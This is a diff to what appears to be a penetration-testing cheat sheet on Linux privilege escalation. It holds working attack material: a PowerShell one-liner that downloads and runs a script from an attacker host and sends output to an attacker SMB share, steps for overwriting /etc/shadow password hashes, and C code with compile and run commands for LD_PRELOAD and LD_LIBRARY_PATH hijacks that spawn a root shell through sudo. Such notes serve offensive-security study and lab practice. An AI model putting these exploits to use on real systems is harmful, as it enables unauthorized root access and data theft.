@@ -374,7 +374,7 @@ On Windows, run an smb server to listen for the inbound output from the tool
 
 <code>PS > IEX (new-object net.webclient).downloadstring('http://[attackerip:port]/enum.ps1') > \\[attackerip]\smb\output.txt</code>
  
-### /etc/shadow - cracking and overwriting
+### /etc/shadow - cracking and overwriting for privesc
 
 #### copy hash from the second position (: delimited) and crack it:
 
@@ -398,4 +398,94 @@ If you can write to /etc/shadow in some way, you can edit the pw hash for any ac
 mkpasswd -m sha-512 password
 $6$Pp.gr7cKYj679e87$U8OdJicmXGASzEhI.QGHNBMg2/JIgA8j8bSGB2pl7nE4ZFLcvjT58qhbAZq42mB0mtO2OztIFTuQaKSeqQO7h1
 ~~~
+
+or
+
+~~~
+openssl passwd newpassword
+$1$NT0O9vV2$CTfKZvh0m9MzX6Cft.FxC1
+~~~
 copy the new password hash to the second field of any user in the shadow file and login with that password you've just created
+
+### sudo and LD_PRELOAD privesc
+
+If ld_preload and env_keep are present when running `sudo -l` then you can create a binary that will run before (preload) any of the listed sudo binaries and it will run as root. 
+
+~~~
+user@debian:-$ sudo -l 
+Matching Defaults entries for user on this host: 
+	env_reset, LD_PRELOAD, env_keep+=LD_LIBRARY_PATH 
+
+User user may run the following commands on this host: 
+	(root) NOPASSWD: /usr/bin/find
+ ~~~
+ 
+ Create a new binary to be run as a preloaded binary:
+ 
+ ~~~
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() { 
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+~~~
+compile:
+~~~
+gcc -fPIC -shared -nostartfiles -o preload.so preload.c
+~~~
+
+run any of the binaries allowed in sudo with LD_PRELOAD called. in this example, it's `find`. You should have a root shell afterwards.
+
+`sudo LD_PRELOAD=preload.so find`
+
+### sudo and LD_LIBRARY_PATH privesc
+
+sudo will also allow for a path to preload libraries. if this variable is set in `sudo -l` and reviewing the shared libraries of available binaries listed in sudo, you can create your own shared library and change the library path for sudo to reference your malicious shared library first.
+
+~~~
+user@debian:-$ sudo -l 
+Matching Defaults entries for user on this host: 
+	env_reset, LD_PRELOAD, env_keep+=LD_LIBRARY_PATH 
+
+User user may run the following commands on this host: 
+	(root) NOPASSWD: /usr/bin/find
+ ~~~
+ 
+ Check for shared libraries for the allowed find binary using `ldd /usr/bin/find`
+ ~~~
+ ldd /usr/bin/find   
+        linux-vdso.so.1 (0x00007ffebd656000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f6d3c3ab000)
+        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f6d3c2d0000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6d3c000000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f6d3c234000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f6d3c22f000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f6d3c439000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f6d3c228000)
+~~~
+Pick one to hijack and create some code. Output your new binary with the same name as the one you pick to hijack
+~~~
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() { 
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+~~~
+compile it, taking care to name it the same as one of the shared libraries listed earlier, for example libdl.so.2
+~~~
+gcc -fPIC -shared -o libdl.so.2 library_hijack.c
+~~~
+
+run sudo referencing the path of your new file, in this case, the current directory
+
+`sudo LD_LIBRARY_PATH=. find`
+
